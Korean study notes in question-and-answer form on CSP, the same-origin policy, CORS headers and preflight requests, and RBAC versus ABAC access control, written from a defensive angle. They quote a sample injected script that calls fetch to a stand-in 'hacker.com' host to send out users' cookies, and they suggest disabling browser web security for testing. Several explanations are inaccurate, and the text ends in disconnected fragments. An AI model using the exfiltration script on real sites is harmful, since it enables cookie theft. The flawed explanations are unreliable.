## CSP 정리
- 서버에서 HTML 문서를 응답할 때 CSP를 적용하려면 어떤 HTTP 응답 헤더를 설정해야 하나요? 블로그에 나온 Express.js 코드 예시를 기반으로 설명해보세요.
    
    
    서버에서 웹 문서를 응답할 때는 **`Content-Security-Policy`** 헤더에 적절한 정책을 명시하면 브라우저가 이를 따르게 된다.
    
    ```tsx
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    ```
    
    - **헤더 설정:** Express의 `res.setHeader()` 함수를 사용하여 브라우저에게 보안 정책을 전달한다
    - **정책 내용:** `"default-src 'self'"`라는 정책을 명시한다. 이는 ‘현재 도메인(self)과 일치하는 출처의 리소스만 허용하겠다'는 의미이다.
    - **작동 원리:** 이 헤더가 포함된 응답을 받은 브라우저는, 다른 도메인(예: 해커의 서버)에서 실행하려는 악성 스크립트나 인라인 스타일 등을 자동으로 차단하여 XSS 공격을 방어하게 된다
    
- `default-src 'self'` 설정은 브라우저에게 어떤 보안 정책을 의미하나요? 또한 `'self'` 값은 어떤 출처를 포함하거나 제외하나요?
    
    **1️⃣ `default-src 'self'` 설정의 의미**
    
    브라우저에게 보내는 기본적인 보안 가이드라인을 의미한다.
    
    - **Fallback 역할** : `default-src` 지시자는 fallback으로 동작한다. `script-src`(자바스크립트), `img-src`(이미지), `style-src`(스타일) 등 개별 자원에 대한 구체적인 정책이 설정되어 있지 않을 때, **기본값**으로 이 정책을 따르게 된다.
    - **보안의 핵심** : 허락 하지 않은 모든 외부 리소스를 다 차단하는 의미로 강력한 보안 정책을 의미한다.
    
    **2️⃣`‘self’` 값이 포함하거나 제외하는 범위**
    
    `‘self’`는 현재 문서의 출처를 의미한다.
    
    | **구분** | **포함/제외 여부** | **설명** |
    | --- | --- | --- |
    | 현재 도메인 | 포함 | 현재 접속 중인 사이트의 도메인과 동일한 곳의 리소스 |
    | 동일 프로토콜 | 포함 | `https`로 접속했다면 `https` 자원만 허용 |
    | 동일 포트 | 포함 | `8080` 포트로 접속했다면 `8080` 포트의 자원만 허용 |
    | 하위 도메인 | 제외 | 하위 도메인도 외부 출처로 간주하여 차단함 |
    | 인라인 스크립트 | 제외 | HTML 파일 안에 직접 적은 `<script>...</script>`나 인라인 스타일도 기본적으로 차단함 |
    | 외부 도메인 | 제외 | 구글 폰트, CDN, 다른 서비스의 API 등 모든 외부 주소 차단 |
    
- 블로그에 나온 악성 스크립트(`<script>fetch(...)</script>`)를 주입했을 때 CSP가 어떻게 동작하는지 네트워크 탭과 콘솔 메시지 측면에서 설명해보세요.
    
    #### **1️⃣ 네트워크 탭 측면**
    
    해커의 서버(`hacker.com`)으로 보내려던 `fetch` 요청이 아예 발생하지 않는다.
    
    - **이유**: 브라우저가 스크립트를 실행하기 전에 CSP 정책을 먼저 확인한다. `default-src 'self'` 에 의해서 요청하려는 목적지자 허용된 출처가 아님을 확인하고 브라우저 엔진 수준에서 네트워크 연결 시도 자체를 사전에 차단한다. 따라서 해커는 유저의 쿠키 정보를 받을 수 없다.
    
    #### 2️⃣ 콘솔 메시지 측면
    
    Content Security Policy 에러가 뜬다. 에러 메세지 “다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했다”를 확인할 수 있다. 
    
    - **세부 사항**
        - **스크립트 차단** : `script-src-elem` 지시자 위반으로 인해 인라인 스크립트 실행이 거부되었다고 나온다.
        - **스타일 차단** : 스크립트 뿐만 아니라 인라인 스타일 `style-src-elem` 또한 정책 위반으로 차단되었다는 에러창이 뜬다.
        
        → 만약 정말 필요한 스크립트라면 `hash`나 `nonce` 와 같은 수단을 사용하라는 대안 메세지가 포함되어 있다.
        
- 기본 CSP 설정에서 인라인 스타일이 차단된다고 했습니다. 블로그 예시 중 `width:600px`이 적용되지 않는 이유를 설명하세요.
    
    `width: 600px` 같은 인라인 스타일이 적용되지 않는 이유는 CSP의 기본 정책(`default-src 'self'`)이 보안을 위해 모든 인라인 리소스를 기본적으로 허용하지 않기 때문이다.
    
    🔷 **self의 범위 제한** : `default-src 'self'`에서 `'self'`는 별도의 외부 파일(예: `style.css`)로 존재하는 자원만 허용한다.
    
    🔷 **인라인 스타일** : HTML 태그 안에 직접 스타일을 적는 인라인 스타일 방식은 해커가 악성 스크립트를 주입할 때 악용될 수 있다.
    
    🔷 **브라우저의 판단** : 브라우저는 HTML에 작성된 스타일을 신뢰할 수 없는 코드로 간주하기에 실행을 차단한다. 따라서  `width: 600px` 가 코드에 작성되어있어도 반영되지 않는다.
    
- 구글 애널리틱스, 카카오맵, 외부 API 등이 CSP 때문에 차단될 수 있다고 했습니다. 이러한 현상을 "건물 보안을 강화한다"는 비유와 연결해 설명해보세요.
    
    건물 보안을 강화한다고 모든 출입문을 막아버려서, 정작 직원들도 출입하지 못하는 상황이다.
    
- Report-Only 모드에서는 실제 리소스 실행이 차단되지 않습니다. 그 대신 브라우저와 서버에서 각각 어떤 동작을 수행하나요?
    
    `'Content-Security-Policy-Report-Only'`응답 헤더를 사용한다.
    
    ```tsx
    res.setHeader(
      'Content-Security-Policy-Report-Only',
      "default-src 'self'; report-uri /report"
    );
    ```
    
    🔷 **브라우저** 
    
    **1️⃣ 진단** :  웹 페이지를 불러올 때 CSP 정책 위반 사항이 있는지 **진단만** 한다. 리소스(스크립트, 스타일 등)의 실행을 차단하지 않고 그대로 **허용**한다.
    
    2️⃣ **보고서** : 정책 위반을 발견하는 즉시 헤더에 설정된 `report-uri` 경로로 위반 내용이 담긴 JSON 형식의 보고서를 POST 요청으로 보낸다.
    
    **🔷 서버**
    
    1️⃣ **보고서 수신** : 브라우저가 보낸 POST 요청을 받아서 처리한다. 데이터를 합쳐서 JSON으로 파싱하는 과정을 거친다.
    
    2️⃣ **분석** : 수신한 보고서를 콘솔에 출력하거나 로그 파일 / DB에 저장한다. 
    
    ✅ **정리 :** Report-Only 모드에서 브라우저는 보안 정책 위반을 감지하더라도 리소스 실행을 차단하지 않고 정상적으로 수행하되, 위반 내역을 지정된 경로로 즉시 전송한다. 서버는 브라우저가 보낸 위반 보고서(JSON)를 수신하고 기록하여, 실제 서비스 차단 없이 잠재적인 보안 취약점이나 정책 수정 필요성을 모니터링하는 역할을 수행한다.
    
- CSP만으로는 CSRF를 막을 수 없다고 했습니다. 블로그에 정리된 다른 보안 조치들(SameSite 쿠키, X-Frame-Options 등) 중 2가지를 설명하세요.
    
    CSP는 XXS 공격 방어에는 효과적이지만, CSRF와 같은 다른 유형의 공격은 막지 못한다.
    
    #### 🔷 쿠키 보안 설정
    
    **1️⃣ SameSite 속성**
    
    쿠키가 어떤 상황에서 전송 될지 결정하는 속성이다
    
    - **작동 방식** :
        - Strict : 현재 접속 중인 도메인에서 보낸 요청에만 쿠키를 포함한다.
        - Lax (기본 값) : 다른 사이트에서 링크를 타고 넘어 올 때는 허용되지만 외부 사이트에서 서버로 데이터를 보내는 요청은 차단한다.
    - **보안** : 사용자 모르게 해커의 사이트에서 서버로 요청을 보내는 **CSRF 공격**을 봉쇄한다.
    
    **2️⃣ HttpOnly 속성**
    
    자바스크립트가 쿠키에 접근하지 못하게 막는 설정이다.
    
    - **작동 방식** : 오직 HTTP(S) 통신을 통해서만 서버로 전달되며, 브라우저의 스크립트로는 읽을 수도 수정할 수도 없다.
    - **보안** : 악성 스크립트를 심어 쿠키를 탈취하려는 XXS 공격으로부터 계정 정보를 보호한다.
    
    **3️⃣ Secure 속성**
    
    쿠키가 HTTPS 암호화된 통신 환경에서만 전송되도록 강제하는 설정이다.
    
    - **작동 방식** : `http://` 로 시작하는 불안전한 연결을 시도하면 브라우저는 쿠키를 서버로 보내지 않는다.
    - **보안** : 해커가 통신 내용을 엿듣는 스니핑 공격을 통해 쿠키 정보가 평문으로 유출되는 것을 방지한다.
    
    #### 🔷 입력데이터 검증
    
    **1️⃣ Sanitize**
    
    사용자 입력 값 중에서 위험한 스크립트 태그나 악성 코드만 골라서 삭제하는 과정이다.
    
    - **작동 방식** : `<script>alert('해킹')</script>` 라고 입력하면 위험한 태그 `<script>`자체를 지우고 안전한 텍스트만 남긴다.
    - **보안** : XXS 공격자가 몰래 심어둔 실행 코드를 무력화 한다.
    
    **2️⃣ Escape**
    
    문자가 코드가 실행되지 않도록 특수 문자를 안전한 형태의 문자열로 변환한다.
    
    - **작동 방식** : `<` 기호를 `&lt;`로, `>` 기호를 `&gt;`로 바꾼다. 브라우저는 HTML 태그가 아니라 글자로 인식한다.
    - **보안** : 데이터가 의도하지 않게 브라우제에서 실행되는 것을 막아 XSS 공격을 방어한다.
    
    **3️⃣ Validation**
    
    데이터가 규칙에 맞는지 확인하는 절차이다.
    
    - **작동 방식** : 나이 입력란에 문자가 들어오진 않았는지 이메일 주소에 @가 포함되었는지 등을 체크한다.
    - **보안** : 비정상적인 데이터 입력을 차단하여 SQL Injection 같은 서버 공격을 막고, 데이터 베이스의 무결성을 유지한다.
    
    #### 🔷 추가 보안 헤더
    
    **1️⃣ X-Frame-Options**
    
    우리 사이트가 다른 사이트의 `<iframe>`이나 `<frame>` 안에 들어갈 수 있는지 결정하는 헤더이다.
    
    - **작동 방식** : `DENY`(모두 차단)나 `SAMEORIGIN`(내 사이트에서만 허용)으로 설정한다
    - **보안** : 해커가 투명한 프레임으로 우리 사이트를 덮어씌워 사용자의 클릭을 가로채는 클릭재킹 공격을 차단한다.
    
    **2️⃣ X-Content-Type-Options**
    
    브라우저가 파일의 확장자나 내용을 멋대로 해석하지 못하게 막는 설정이다
    
    - **작동 방식** : 값을 `nosniff`로 설정한다. 브라우저는 서버가 보내준 `Content-Type` 헤더에 적힌 형식대로만 파일을 읽는다
    - **보안** : 위장한 악성 스크립트 파일을 브라우저가 자바스크립트로 오해해서 실행해버리는 MIME 스니핑 공격을 방지한다.
    
    **3️⃣ Strict-Transport-Security**
    
    사용자가 `http://` 로 접속하더라도 브라우저가 자동으로 `https://`로 바꿔서 접속하게 강제하는 규칙이다.
    
    - **작동 방식** : 일정 기간 동안 무조건 HTTPS로만 통신하도록 브라우저가 기억하게 한다.
    - **보안** : 암호화되지 않은 HTTP 통신을 노리는 도청이나 가로채기 공격을 막아주어 통신의기밀성을 유지한다.

    ## SOP 정리

    - 출처(Origin)는 어떤 세 요소의 조합으로 결정되나요?
    
    출처는 다음 **세 가지 요소**의 조합으로 결정된다
    
    **1️⃣ 프로토콜 (Protocol)** : 통신 규약을 의미한다. (예 : `http`, `https`)
    
    **2️⃣ 호스트 (Host)** : 사이트의 주소나 도메인 (예: `localhost`)
    
    **3️⃣ 포트 (Port)** : 서버의 접속 통로 번호 (예 : `443`, `8080` )
    
    세 가지 요소가 **모두 일치**해야만 브라우저는 이를 **동일 출처로 간주**한다. 만약 이 중 하나라도 다르면 교차 출처가 되어 보안 정책에 따라 접근이 제한 될 수 있다.
    
- 출처의 요소가 다른 경우(예: 프로토콜만, 포트만 다른 경우)에 같은 출처인지 아닌지를 예시 3개(같은 출처 1개, 다른 출처 2개)로 설명하세요.
    
    **기준 : http://matthew.com:8080**
    
    → 브라우저는 세 가지 요소가 모두 동일해야 인증해준다.
    
    | **비교 주소** | **출처 판정** | **이유** |
    | --- | --- | --- |
    | [**http://matthew.com:8080/user/profile**](https://www.google.com/search?q=http://matthew.com:8080/user/profile) | **같은 출처** | 경로(Path)가 달라도 앞의 3요소가 같으면 같은 출처이다 |
    | [**https://matthew.com:8080**](https://www.google.com/search?q=https://matthew.com:8080) | **다른 출처** | **프로토콜**이 다르다. 보안 수준이 다르기 때문에 다른 출처로 본다 |
    | [**http://matthew.com**](http://matthew.com/) | **다른 출처** | **포트**가 생략되면 기본값인 `80`으로 간주하므로, `8080`과는 다른 출처이다. |
    | [**http://api.matthew.com:8080**](https://www.google.com/search?q=http://api.matthew.com:8080) | **다른 출처** | 서브 도메인(Host)이 다르다 |
    | [**http://matthew.com:8081**](https://www.google.com/search?q=http://matthew.com:8081) | **다른 출처** | **포트**가 다르다. 같은 서버 컴퓨터 내에서도 포트가 다르면 차단한다 |
    
    **❓ 경로(Path)가 상관 없는 이유는?**
    
    동일한 웹사이트 안에서 페이지를 이동할 때마다 출처가 달라지면 웹 서핑이 불가능해지기 때문이다.
    
    **❓ 하위 도메인은 왜 다른가?**
    
    관리의 주체가 다를 수도 있기에 서로의 데이터에 함부로 점근하지 못하게 격리해두는게 보안상 안정하기 때문이다. 예를 들면, `mail.naver.com`과 `cafe.naver.com`를 분리하는 것이다.
    
    **❓ 포트 번호가 생략 된다면?**
    
    http는 기본적으로 80번 포트, https는 443번 포트를 사용한다. 주소창에 포트 번호를 작성하지 않으면 브라우저는 이 기본값으로 판단해서 비교한다.
    
- 블로그에 나온 `fetch` 기반 악성 스크립트를 다른 출처로 실행했을 때 브라우저에서 어떤 일이 발생하나요? 네트워크 전송 여부, 응답 사용 가능성, 브라우저 콘솔 메시지 측면에서 서술하세요.
    
    `<script>fetch('http://hacker.com/...')</script>` 를 실행하였을 때 브라우저의 반응
    
    **1️⃣ 네트워크 전송 여부**
    
    네트워크 요청은 해커의 서버로 전송된다. 브라우저는 요청을 보내야 안전한지 아닌지 판단할 수 있기에 서버까지 신호는 가지만 그 이후가 막힌다.
    
    **2️⃣ 응답 사용 가능성**
    
    해커의 서버에서 응답을 보내고 브라우저는 그 응답 데이터를 **사용할 수 없게 차단**한다. SOP 정책에 의해 다른 출처에서 온 데이터는 현재 페이지의 스크립트가 읽고나 조작할 수 없도록 격리되기 때문이다. 
    
    **3️⃣ 브라우저 콘솔 메시지** 
    
    “동일 출처 정책으로 인해 **`hacker.com`**에 있는 원격 리소스를 차단했다” 관련 오류 메시지가 표시된다.
    
- SOP가 어떻게 Session Hijacking(세션 하이재킹) 시도를 방지하는지 구체적으로 설명하세요. SOP가 차단하는 것과 허용되는 것(예: 네트워크 요청은 나가지만 응답 데이터에 접근 불가)을 포함하세요.
    - **세션 하이재킹(Session Hijacking)**은 해커가 사용자의 로그인 정보(세션 쿠키)를 가로채서 본인인 것처럼 행동하는 공격을 의미한다.
    
    #### ⭕ 허용
    
    **1️⃣ 네트워크 요청은 허용한다.**
    
    사용자가 악성 코드가 든 페이지를 열면, 브라우저는 해커 서버로 fetch() 요청을 보낸다. 브라우저는 요청을 보내기 전까지 요청이 보안 위반인지 아닌지 확신할 수 없기 때문에 신호는 서버로 전달한다.
    
    #### ❌ 차단
    
    **1️⃣ 응답 데이터 접근을 차단한다.**
    
    해커 서버가 사용자의 중요 정보나 세션 데이터를 넘겨주라고 응답을 보낸다. 브라우저가 응답을 받는 순간, 응답을 보낸 곳과 현재 페이지 출처가 다르다고 판단하여 자바스크립트가 이 데이터를 읽지 못하게 격리시킨다. 따라서, 해커의 스크립트는 응답 데이터에 접근 할 수 없으므로 세션 정보를 빼내거나 조작할 수 없게 된다.
    
    **2️⃣ 쿠키 및 민감 정보 접근 제한**
    
    SOP는 다른 출처의 스크립트가 현재 사이트의 `document.cookie`, `localStorage`등에 접근하는 것을 기본적으로 금지한다. 따라서 해커가 다른 사이트에서 로그인 쿠키를 읽어가려도 해도 SOP가 막아서기에 세션 하이재킹이 어려워진다.
    
- 블로그에서 명시한 대로 SOP가 반드시 동일 출처에서만 접근하도록 하는 주요 브라우저 API/리소스 3가지를 쓰고, 각각에 대해 간단한 설명(왜 제한되는지)을 덧붙이세요.
    
    **1️⃣ `fetch()` API**
    
    자바스크립트를 사용해서 네트워크를 통해 리소스를 비동기적으로 가져오는 최신 인터페이스이다. 제한되는 이유는 다른 출처의 데이터를 자유롭게 읽을 수 있다면, 해커가 사용자의 개인정보나 로그인 세션 정보를 자신의 서버로 빼돌릴 수 있기에 보안상 엄격히 제한된다.
    
    **2️⃣ `XMLHttpRequest`**
    
    서버의 응답 데이터를 직접 다루는 도구이다. 악성 스크립트가 사용자의 민감한 응답 데이터를 가로채지 못하도록 SOP가 데이터 접근을 차단한다.
    
    **3️⃣ @font-face 웹 폰트**
    
    서버에 저장된 폰트 파일을 불러와 웹 페이지의 텍스트에 적용하는 스타일 규칙이다. 제한 되는 이유는 웹 폰트 파일은 저작권의 문제도 있고 파일을 내려받는 과정에서 보안 취약점이 발생할 수 있다. 브라우저는 보안 및 자산 보호를 위해 출처가 다른 곳에서 폰트를 가져오는 것을 기본적으로 제한한다.
    
- SOP와 CSP의 차이를 블로그 내용에 따라 요점 4개(각 항목 1문장)로 정리하세요. (예: 누가 적용하는가, 제어 주체, 설정 가능 여부 등)
    
    SOP와 CSP 모두 `XXS(Cross-Site-Scripting)` 공격 방지를 목표로 하지만 접근 방식이 다르다.
    
    **1️⃣ 적용 주체**
    
    - **SOP** : 브라우저가 자체적으로 적용하는 기본 보안 메커니즘
    - **CSP** : 서버와 브라우저가 협력하여 실행하는 정책
    
    **2️⃣ 설정 및 제어**
    
    - **SOP** : 개발자가 직접 제어하거나 설정 할 수 없는 영역이다
    - **CSP** : 개발자가 HTTP 응답 헤더를 통해 서비스 요구사항에 맞게 직접 설정 할 수 있다.
    
    **3️⃣ 유연성**
    
    - **SOP** : 모든 웹페이지에 자동적이고 일률적으로 적용된다
    - **CSP** : 애플리케이션별로 맞춤 설정이 가능하고 “Report-Only’ 모드 등을 통해 단계적으로 적용할 수 있다.
    
    **4️⃣ 역할 비유**
    
    - **SOP** : 건물의 벽이나 문 같은 구조적 보안 장치
    - **CSP** : 건물주가 출입 명단을 관리하고 특정 행동을 제한하는 보안 규칙
    
- 브라우저에서 SOP 관련 차단 오류를 발견했을 때(예: 콘솔에 “동일 출처 정책으로 인해 ... 차단했습니다” 메시지) 문제 원인 파악을 위한 체크리스트(최소 3항목)를 작성하고, 임시·영구 대응 방안(각 1~2줄)도 제시하세요.
    
    #### **✅ 체크리스트 항목**
    
    - [ ]  **출처 (Origin) 3가지 요소 대조** : 현재 접속 중인 주소와 요청하려는 주소의 프로토콜(http / https), 호스트(도메인), 포트 번호 중 하나라도 다른 부분이 있는지 확인한다.
    - [ ]  **리소스 유형 확인** : 요청하려는 자원이 `<script>`나 `<img>`처럼 **교차 출처가 허용**되는 태그인지, 아니면 `fetch()`나 `XMLHttpRequest`처럼 SOP가 **차단하는 자원**인지 확인한다.
    - [ ]  서버 응답 헤더 확인 : 상대방 서버에서 `Access-Control-Allow-Origin` 같은 ****CORS 관련 헤더를 보내주고 있는지 혹은 오타가 없는지 확인한다.
    
    **✅ 임시 대응 방안 (개발/테스트 단계)**
    
    **브라우저 보안 설정 해제** : 크롬 실행 시 `-disable-web-security` 플래그를 사용하거나 ‘Allow CORS’ 같은 확장 프로그램을 사용하여 일시적으로 SOP 검사를 끄고 테스트 할 수 있다.
    
    **✅ 영구 대응 방안 (개발/테스트 단계)**
    
    - **CORS 설정** : 서버 측 응답 헤더에 `Access-Control-Allow-Origin : [허용할 출처]`를 추가하여 브라우저가 안전하게 데이터를 가져오도록 허락해 줘야 한다.
    - 프록시(Proxy) 서버 활용 : 프론트엔드와 동일한 출처에 프록시 서버를 두어 브라우저 대신에 서버가 외부 데이터를 가져오게 함으로써 우회한다.

## CORS 정리
- 브라우저에서 `http://localhost:8080` 애플리케이션이 `http://localhost:8081/resource.json`을 요청했을 때, 네트워크 요청과 응답은 어떻게 처리되며, 브라우저가 응답 본문을 사용하지 못하는 이유는 무엇인가요?
    
    #### 🔷 네트워크 요청과 응답의 처리
    
    - **요청 전송** : 브라우저는 출처가 다르더라도 서버(`localhost:8081`)로 네트워크 요청을 정상적으로 보낸다.
    - **응답 수신** : 서버 역시 요청을 받고 리소스(`resource.json`)를 담아 응답을 브라우저에게 돌려준다. 물리적인 데이터 통신은 서버와 브라우저 사이에서 성공적으로 일어난다.
    
    #### 🔷 브라우저가 응답 본문을 사용하지 못하는 이유
    
    브라우저의 보안 검사 때문이다
    
    1️⃣ **CORS 헤더 부재** : 브라우저는 응답을 받은 후 응답 헤더에 `Access-Control-Allow-Origin` 이 있는지 확인한다.
    
    2️⃣ **출처 불일치 판단** : 서버(`8081`)가 보낸 응답 헤더에 현재 애플리케이션의 출처인 `http://localhost:8080` 을 허용한다는 명시가 없으면 브라우저는 `8081`는 `8080`에게 자원 사용을 허락하지 않았다고 판단한다.
    
    3️⃣ **최종 차단** : 브라우저는 보안을 위해서 스크립트가 응답 본문(Body)에 접근하지 못하도록 강제로 차단하고 콘솔에 교차 출처 요청 차단 에러를 띄우게 된다.
    
    #### 🔷 브라우저는 다른 출처로 요청을 보낼 때
    
    1. 응답 헤더 중 **`Access-Control-Allow-Origin`**을 확인한다
    2. 이 헤더에 현재 출처가 포함되어 있는지 검사한다
    3. 서버가 해당 출처를 허용했는지 판단한다
    
- 서버가 다른 출처(`http://localhost:8080`)에서 자원을 사용할 수 있게 하려면 어떤 응답 헤더를 어떻게 설정해야 하나요? 글의 예시 코드를 참고해 헤더 이름과 값까지 구체적으로 쓰세요.
    
    **`Access-Control-Allow-Origin`** 헤더를 설정해야 한다.
    
    ```tsx
    const handler = (req, res) => {
      // localhost:8080 출처를 허용
      res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
      static(path.join(__dirname, 'public'))(req, res);
    };
    ```
    
- 단순 요청으로 분류되기 위해서는 어떤 두 가지 조건을 만족해야 하나요? 또한 `GET /resource.json` 요청이 단순 요청에 해당하는 이유를 설명하세요.
    
    #### 🔷 단순 요청 두가지 조건
    
    **1️⃣ 허용된 HTTP 메소드 사용**
    
    `GET` `POST` `HEAD` 메소드 중 하나를 사용해야한다.
    
    **2️⃣ 안전한 헤더 사용**
    
    교차 출처 요청에서 사용할 수 있는 헤더를 안전한 헤더라고 한다.
    
    - 예) `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
    
    #### 🔷 GET /resource.json 요청이 단순 요청에 해당하는 이유
    
    - GET 메소드를 사용했으므로 허용된 메소드 조건에 부합한다.
    - 브라우저가 기본적으로 생성하는 안전한 헤더들만 사용하여 요청을 보냈기 때문이다.
    
- 브라우저에서 `X-Goguma`라는 커스텀 헤더를 추가했을 때 왜 차단이 발생하나요? 이 문제를 해결하기 위해 서버에서 추가해야 하는 응답 헤더와 값은 무엇인가요?
    
    #### 🔷 차단이 발생하는 이유
    
    커스텀 헤더는 브라우저가 정한 안전한 헤더 목록에 포함되지 않기 때문이다.
    
    브라우저는 교차 출처 요청에서 안전하지 않은 헤더가 포함되면, 해당 헤더를 사용해도 되는지 서버에게 확인 받아야 한다고 판단한다. 따라서, 동일 출처 정책 (SOP)에 의해 응답이 차단되고 오류가 발생한다.
    
    #### 🔷 문제 해결을 위한 서버의 응답 헤더와 값
    
    서버는 **`Access-Control-Allow-Headers`** 헤더를 설정해야 한다. 해당 헤더에 허용할 헤더 이름을 명시해야 한다. 
    
    - 추가해야 할 헤더 이름: `Access-Control-Allow-Headers`
    - 설정해야 할 값**:** `X-Goguma`
    
    ```jsx
    // 예시 코드
    const handler = (req, res) => {
      res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
      // X-Goguma 헤더를 허용
      res.setHeader('Access-Control-Allow-Headers', 'X-Goguma');
      static(path.join(__dirname, 'public'))(req, res);
    };
    ```
    
    **✅ 요약** : X-Goguma는 브라우저가 허용하는 안전한 헤더 목록에 해당하지 않는 커스텀 헤더이기 때문에, 서버의 명시적인 허락 없이는 차단된다. 이를 해결하려면 서버 응답 헤더에 `Access-Control-Allow-Headers`를 추가하고 그 값으로 `X-Goguma`를 명시하여 브라우저가 해당 헤더를 안전하게 사용할 수 있도록 승인해야 한다.
    
- `PUT` 요청을 보낼 때 브라우저는 왜 먼저 `OPTIONS` 요청을 보내나요? 이때 브라우저가 보내는 헤더와 서버가 응답해야 하는 헤더를 각각 쓰고, 사전 요청과 실제 요청이 어떻게 이어지는지 간단히 서술하세요.
    
    **🔷 브라우저가 먼저 OPTIONS 요청을 보내는 이유**
    
    `PUT`, `PATCH`, `DELETE`와 같은 메소드는 서버의 데이터를 변경 할 수 있는 요청이다. 브라우저는 실제 요청을 보내기전에 서버가 안전한 곳인지 해당 요청을 처리할 준비가 되었는지 미리 확인하기 위해 `OPTIONS` 메소드를 사용한 사전 요청을 보낸다. 서버에 가해질 수 있는 의도치 않은 손상을 방지하기 위해 보안 절차이다.
    
    **🔷 헤더와 서버가 응답해야 하는 헤더**
    
    - **브라우저의 요청 헤더** : `Access-Control-Request-Method: PUT` 을 추가 해야한다
        
        ```jsx
        const handler = (req, res) => {
          res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
          res.setHeader('Access-Control-Allow-Headers', 'X-Goguma');
          // PUT 메소드를 허용
          res.setHeader('Access-Control-Allow-Methods', 'PUT');
          static(path.join(__dirname, 'public'))(req, res);
        };
        ```
        
    - **서버의 응답 헤더** : `Access-Control-Allow-Methods: PUT` 을 추가해야 한다.
    
    **🔷 사전 요청과 실제 요청의 흐름**
    
    1. **사전 요청 단계** : 브라우저가 `OPTIONS` 메소드로 서버에 사전 요청을 보낸다. 이때 위에서 말한 `Access-Control-Request-Method` 헤더를 실어 보낸다.
    2. **서버의 승인** : 서버가 응답 헤더에 `Access-Control-Allow-Methods: PUT`을 담아 보냄으로써 사용을 허락한다.
    3. **실제 요청 단계** : 서버의 허락을 확인한 브라우저가 진짜 데이터를 담은 실제 `PUT` 요청을 전송하고 응답을 받아온다.

    ## ABAC 정리
    - **RBAC**의 한계에 대해 설명해주세요.
    
    RBAC는 사용자의 역할에 따라 권한을 부여하는 방식이다. 서비스가 커진다면 몇가지 한계에 직면한다.
    
    **1️⃣ 복잡한 예외 케이스 대응 불가**
    
    예를 들어 학생을 글 삭제를 할 수 없지만 본인이 쓴 글은 된다. 또는 원장은 되지만 권한이 꺼진 원장은 안된다와 같은 세부적인 예외 조건을 역할 하나만으로는 설명하기 어렵다. 따라서 `if (isOwner || isAdmin || isPrincipal)` 처럼 하드 코딩으로 처리하는 조건문이 늘어난다.
    
    **2️⃣ 역할 문제**
    
    예외 상황을 해결하기 위해 ‘삭제 가능한 원장’, ‘삭제 불가능한 원장’, ‘본인 글만 지우는 학생’ 등 역할을 계속해서 새로 만들다 보면 역할을 종류가 수없이 많아진다.
    
    **3️⃣ 유연성 및 확장성 부족**
    
    학원마다 권한 설정이 다르거나 사용자의 특정 상태에 따라 권한이 바뀌어야 하는 동적인 상황을 반영하기 어렵다. 새로운 기획 요건이 추가될 때마다 기존의 역할 체계를 수정해야 하는 부담이 생긴다
    
- **ABAC**으로의 전환, 어떤 '기준'이 적절할까요?
    
    **1️⃣ 역할만으로 설명되지 않은 ‘예외’가 많아질 때**
    
    원장(PRINCIPAL)이면 다 돼요가 아니라, 원장 중에서도 '챌린지 삭제 권한'이 활성화된 분만 돼요 처럼 역할 내에서도 **개별적인 속성에 따라 권한이 갈리기 시작할 때** 전환이 필요하다.
    
    **2️⃣ 관계나 리소스의 상태를 따져야 할 때**
    
    누가 하느냐가 아니라 그 리소스가 누구의 것인가 또는 어떤 상태인가를 확인해야 할 때이다. 예를 들어, 학생(STUDENT)은 삭제 불가가 아니라, 학생이더라도 본인이 작성한(`ownerId === userId`) 글이면 삭제 가능이라는 로직이 들어가는 시점에는 전환이 필요하다.
    
    **3️⃣ 권한이 달라질 때**
    
    사용자가 여러 그룹에 소속되어 있고 환경에 따른 동적 권한 관리가 필요할 때이다.
    
    **4️⃣ 로직이 너무 복잡해질때**
    
    `if (isAdmin || (isPrincipal && hasDetailAuth) || isOwner)`와 같은 복잡한 조건문이 여러 컴포넌트에 중복해서 나타날 때이다.
    
- 어떤 서비스 영역에 **RBAC**을 남겨두고, **ABAC**을 도입하시겠어요?
    
    단순 명료한 영역은 RBAC로 유지하고 복잡한 비즈니스 로직이 들어가는 영역에 ABAC을 도입하는 것이 좋을것 같다.
    
    **🔷 RBAC를 남겨둘 영역**
    
    - **대상** : 시스템 관리자(`ADMIN`), 일반 사용자(`USER`), 유료 멤버십 여부 등 전역적인 역할
    - **예** : `user.appRole === 'ADMIN'`과 같이 서비스 전체에서 변하지 않는 최상위 권한 레이어는 RBAC로 남겨두면 될 것 같다.
        
        → 관리자 페이지 접근 권한처럼 확인하면 되는 단순한 구조는 RBAC이 훨씬 빠르고 직관적이다. 모든 속성을 따질 필요가 없기 때문에 적합하다.
        
    
    **🔷 ABAC 도입할 영역**
    
    - **대상** : 게시글 삭제, 시험지 수정, 학생 정보 조회 등 개별 리소스에 대한 액션
    - 예 : `hasPermission(user, 'challenges', 'delete', challenge)`와 같이 유저 속성(`academyRolesDetail`)과 리소스 속성(`ownerId`)을 동시에 체크해야 하는 레이어
        
        →  블로그 사례처럼 **상황과 조건**을 따져야 하는 영역
        
- 여러분들은 다른 부서에서 요청을 받았을 때 어떤식으로 행동하실껀가요?
    
    **1️⃣ 확장성을 고려한 구조 설계하기**
    
    요청만 해결하는 `if`문을 추가하기보다, 나중에 비슷한 요청이 들어와도 대응하기 쉬운 공통 시스템을 고민하기
    
    **2️⃣ 데이터 기반으로 소통하기**
    
    블로그에서 FE 개발자가 백엔드에 `canDeleteChallenge` 플래그를 요청했던 것처럼, 타 부서와의 협업에서 필요한 자원을 제시하기
    
    **3️⃣ 기획 의도 파악하기**
    
    이 권한이 왜 필요한지, 앞으로 어떤 예외 케이스가 더 생길 수 있는지를 먼저 기획자(PM)에게 물어보며 생각하기

        2. **httpOnly Cookie:** `httpOnly` 옵션을 걸면 자바스크립트가 쿠키를 읽을 수 없어 XSS로부터는 안전하다. 하지만 브라우저가 요청 시 쿠키를 자동으로 실어 보내는 특징 때문에, 사용자가 모르는 사이에 가짜 요청을 보내는 CSRF 공격에 노출될 수 있다. (이는 `SameSite` 속성으로 보완한다)

            ✅새로고침하면 메모리의 Access Token은 날아가지만, 쿠키에 담긴 Refresh Token을 이용해 자동으로 새 Access Token을 발급받아 다시 메모리에 올림

    ```jsx
    let refreshPromise = null;      // 갱신 Promise 공유

      isRefreshing = false;
    ```

